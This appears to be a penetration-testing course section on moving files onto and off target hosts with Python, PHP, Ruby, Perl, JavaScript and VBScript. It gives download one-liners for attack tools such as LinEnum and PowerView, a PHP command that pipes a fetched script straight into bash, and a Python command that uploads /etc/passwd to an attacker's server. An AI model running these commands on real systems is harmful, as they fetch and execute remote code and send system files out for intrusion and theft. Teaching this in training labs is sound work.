It's common to find different programming languages installed on the machines we are targetting. 
Programming languages such as Python, PHP, Perl, and Ruby are commonly available in Linux distributions but can also be installed on Windows, although this is far less common.

We can use some Windows default applications, such as cscript and mshta, to execute JavaScript or VBScript code. JavaScript can also run on Linux hosts.

According to Wikipedia, there are around 700 programming languages, and we can create code in any programing language, to download, upload or execute instructions to the OS. This section will provide a few examples using common programming languages.

## Python2 download
`python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`

## Python3 download
`python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`

## PHP Download with File_get_contents()
`php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`

An alternative to file_get_contents() and file_put_contents() is the fpopen() module. We can use this module to open a URL, read it's content and save it into a file.

## PHP Download with Fopen()
`php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`

We can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.

## PHP Download a File and Pipe it to Bash
`php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`

**Note**: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.


## Ruby
`ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`

## Perl
`perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`

## JavaScript
`
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
`
We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.

## Download a File Using JavaScript and cscript.exe
`cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1`

## VBScript
`
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
`

We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.

`cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1`

## Upload Operations using Python3

If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 requests module allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 uploadserver.

- `python3 -m uploadserver`
- `python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'`
